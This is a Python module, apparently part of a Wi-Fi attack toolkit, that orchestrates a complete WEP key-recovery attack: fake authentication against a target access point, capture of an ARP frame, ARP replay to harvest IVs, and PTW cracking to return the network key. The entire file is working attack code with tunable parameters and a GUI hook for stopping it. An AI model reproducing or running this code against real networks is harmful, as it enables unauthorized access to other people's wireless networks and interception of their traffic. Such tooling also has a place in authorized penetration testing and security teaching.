"""WEP key recovery: orchestrate fake-auth, ARP replay, and PTW cracking."""

from __future__ import annotations

import time

from scapy.packet import Packet
from scapy.sendrecv import sendp, sniff

from ..frames import with_forced_rate
from ..wep.ptw import PTWVoteTable, compute_key
from .wep import add_captured_frame_to_table, fake_authenticate
from .wep_replay import replay_arp


def crack_wep(
    iface: str,
    bssid: str,
    client: str,
    ssid: str,
    key_len: int,
    channel: int | None = None,
    target_sessions: int = 40_000,
    timeout: float = 300.0,
    replay_batch: int = 500,
    replay_interval: float = 0.01,
    poll_interval: float = 2.0,
    top_k: int = 16,
    max_candidates: int = 200_000,
    low_rate: bool = False,
    sniff_fn=sniff,
    sendp_fn=sendp,
    auth_fn=fake_authenticate,
    progress_fn=None,
    stop_event=None,
) -> bytes | None:
    """Full attack: fake-auth, find one ARP frame, replay it, harvest IVs,
    recover the key with PTW. Not yet live-tested (see STATUS.md) —
    sendp/sniff/auth are injectable (whole-function injection, matching
    omni.py's pmkid_fn/handshake_fn/deauth_fn pattern rather than
    threading a sendp_fn down into fake_authenticate itself) so the
    orchestration itself is unit-testable without touching hardware.

    `top_k`/`max_candidates` default to the values empirically validated
    in tests/test_wep_ptw.py (25k sessions, top_k=16), not compute_key's
    own defaults (8/50_000), which weren't sufficient at that scale.

    stop_event (optional): checked once per poll_interval so the GUI's
    Stop Attack button can actually abort this instead of the caller being
    stuck for up to `timeout` seconds regardless — confirmed live
    (2026-08-28) that without this, Stop Attack on a running WEP attack
    was a no-op until the full 300s default timeout elapsed.

    Returns the recovered root key, or None if `timeout`/`stop_event` fires first.
    """
    auth_fn(iface, bssid, client, ssid, channel=channel)

    table = PTWVoteTable(num_positions=key_len)
    deadline = time.monotonic() + timeout
    seed_frame: Packet | None = None

    def on_packet(pkt: Packet) -> None:
        nonlocal seed_frame
        if add_captured_frame_to_table(table, pkt) and seed_frame is None:
            seed_frame = with_forced_rate(pkt, mbps=2) if low_rate else pkt

    while (
        time.monotonic() < deadline
        and len(table.sessions) < target_sessions
        and not (stop_event is not None and stop_event.is_set())
    ):
        sniff_fn(iface=iface, timeout=poll_interval, prn=on_packet, store=False)
        if progress_fn is not None:
            pct = 100 * len(table.sessions) // target_sessions
            progress_fn(f"WEP IVs: {len(table.sessions)}/{target_sessions} ({pct}%)"
                        + ("  [replaying ARP]" if seed_frame is not None else "  [waiting for ARP seed]"))
        if seed_frame is not None:
            replay_arp(iface, seed_frame, count=replay_batch, interval=replay_interval, low_rate=low_rate)

    if not table.sessions:
        return None
    return compute_key(table, key_len=key_len, top_k=top_k, max_candidates=max_candidates)
